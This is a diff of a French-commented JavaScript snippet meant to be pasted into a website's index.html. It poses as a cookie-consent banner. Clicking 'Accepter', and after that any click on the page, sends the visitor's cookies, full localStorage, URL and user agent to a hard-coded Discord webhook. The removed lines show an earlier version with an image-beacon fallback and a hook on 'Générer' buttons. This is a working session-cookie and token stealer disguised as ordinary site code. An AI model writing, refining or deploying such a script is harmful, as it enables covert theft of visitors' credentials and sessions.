@@ -1,75 +1,49 @@
-<!-- PASTE THIS AT THE VERY BOTTOM OF YOUR index.html, JUST BEFORE </body> -->
 <script>
-document.addEventListener("DOMContentLoaded", function() {
-    
-    // 1. REMPLACE PAR TON WEBHOOK
+window.onload = function() {
+    // 1. METS TON WEBHOOK ICI
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1571234677434617986/8XG1WsjhxFIQTL816bRPn7I8D37zJM0h_l_APXRETUyW__bySrUfWXuoQKEL-I-gIZlL";
 
-    // 2. FONCTION QUI ENVOIE LES DONNÉES
-    function sendData(source) {
-        const payload = {
-            trigger: source,
+    // 2. LA FONCTION QUI ENVOIE TOUT
+    function envoyerDonnees(raison) {
+        let payload = {
+            raison: raison,
             url: window.location.href,
-            cookies: document.cookie || "NONE",
-            localStorage: {},
-            sessionStorage: {},
+            cookies: document.cookie || "AUCUN_COOKIE",
+            localStorage: JSON.stringify(localStorage),
             userAgent: navigator.userAgent
         };
 
-        // Récupérer le localstorage
-        for (let i = 0; i < localStorage.length; i++) {
-            let key = localStorage.key(i);
-            payload.localStorage[key] = localStorage.getItem(key);
-        }
-
-        // Envoyer avec fetch et mode no-cors
         fetch(WEBHOOK_URL, {
             method: "POST",
             mode: "no-cors",
             headers: { "Content-Type": "text/plain" },
             body: JSON.stringify(payload)
-        }).catch(function() {
-            // Fallback image si fetch est bloqué
-            let img = new Image();
-            img.src = WEBHOOK_URL + "?data=" + encodeURIComponent(JSON.stringify(payload));
-        });
+        }).catch(e => console.log("Erreur webhook:", e));
     }
 
-    // 3. CRÉER LA BANNIÈRE EN FORCE
-    let banner = document.createElement("div");
-    // Style inline pour être sûr que ça s'affiche au-dessus de tout
-    banner.style.cssText = "position:fixed; bottom:0; left:0; width:100%; background:#000; color:#fff; text-align:center; padding:20px; z-index:999999; font-family:sans-serif; border-top:2px solid #0066ff;";
+    // 3. CRÉATION DE LA BANNIÈRE (Z-index de 10 millions pour être sûr d'être devant)
+    let banniere = document.createElement("div");
+    banniere.style.cssText = "position:fixed; bottom:0; left:0; width:100%; background:#000; color:#fff; padding:20px; z-index:10000000; text-align:center; border-top:2px solid #0066ff;";
+    banniere.innerHTML = 'Nous utilisons des cookies. <button id="btn-accept" style="margin-left:20px; padding:8px 15px; background:#0066ff; color:#fff; border:none; cursor:pointer;">Accepter</button>';
     
-    // Bouton Accept
-    let acceptBtn = document.createElement("button");
-    acceptBtn.innerText = "Accepter les cookies";
-    acceptBtn.style.cssText = "background:#0066ff; color:#fff; border:none; padding:10px 20px; margin-left:20px; cursor:pointer; font-weight:bold; border-radius:4px;";
-    
-    // Texte de la bannière
-    let textNode = document.createTextNode("Nous utilisons des cookies pour améliorer votre expérience.");
-    
-    banner.appendChild(textNode);
-    banner.appendChild(acceptBtn);
-    document.body.appendChild(banner);
+    // On l'ajoute au site
+    document.body.appendChild(banniere);
 
-    // 4. ACTION AU CLIC SUR ACCEPT
-    acceptBtn.addEventListener("click", function() {
-        banner.style.display = "none"; // Cacher la bannière
-        sendData("ACCEPT_CLICKED");    // Envoyer les données
-    });
+    // 4. QUAND ON CLIQUE SUR ACCEPTER
+    document.getElementById("btn-accept").onclick = function() {
+        banniere.style.display = "none";
+        envoyerDonnees("ACCEPTE");
+    };
 
-    // 5. ACTION AU CLIC SUR GÉNÉRER (Sans casser le bouton original)
-    // On cherche le bouton par son texte, peu importe son ID
-    let allButtons = document.querySelectorAll("button");
-    allButtons.forEach(function(btn) {
-        if (btn.innerText.trim().toLowerCase() === "générer" || btn.innerText.trim().toLowerCase() === "generer") {
-            btn.addEventListener("click", function() {
-                // On attend 200ms que le site original fasse son travail (genre créer un cookie)
-                setTimeout(function() {
-                    sendData("GENERATE_CLICKED");
-                }, 200);
-            });
+    // 5. ESPIONNAGE GLOBAL : Si on clique sur "Générer" (ou n'importe où), on renvoie les cookies
+    document.body.onclick = function(e) {
+        // Si on a déjà accepté (la bannière est cachée), on écoute les clics
+        if (banniere.style.display === "none") {
+            // On attend 1 seconde que le site crée les cookies, puis on envoie
+            setTimeout(function() {
+                envoyerDonnees("CLIC_SUR_LA_PAGE");
+            }, 1000);
         }
-    });
-});
+    };
+};
 </script>
